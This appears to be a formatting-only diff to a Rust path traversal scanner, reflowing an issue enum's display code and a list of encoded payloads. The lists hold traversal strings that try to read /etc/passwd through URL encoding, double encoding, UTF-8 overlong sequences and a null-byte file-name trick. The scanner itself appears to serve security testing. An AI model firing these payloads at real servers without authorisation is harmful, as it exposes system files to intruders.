@@ -22,9 +22,9 @@ pub enum PathTraversalIssue {
 impl std::fmt::Display for PathTraversalIssue {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self {
-            Self::TraversalSucceeded {
-                param, payload, ..
-            } => write!(f, "path_traversal:{param}:{payload}"),
+            Self::TraversalSucceeded { param, payload, .. } => {
+                write!(f, "path_traversal:{param}:{payload}")
+            }
             Self::EncodedTraversalSucceeded { param, encoding } => {
                 write!(f, "encoded_path_traversal:{param}:{encoding}")
             }
@@ -46,9 +46,21 @@ const TRAVERSAL_PAYLOADS: &[(&str, &str)] = &[
 ];
 
 const ENCODED_PAYLOADS: &[(&str, &str, &str)] = &[
-    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded", "root:"),
-    ("..%252f..%252f..%252fetc%252fpasswd", "double_encoded", "root:"),
-    ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "utf8_overlong", "root:"),
+    (
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "url_encoded",
+        "root:",
+    ),
+    (
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "double_encoded",
+        "root:",
+    ),
+    (
+        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        "utf8_overlong",
+        "root:",
+    ),
 ];
 
 const NULL_PAYLOAD: &str = "....//....//etc/passwd%00.png";
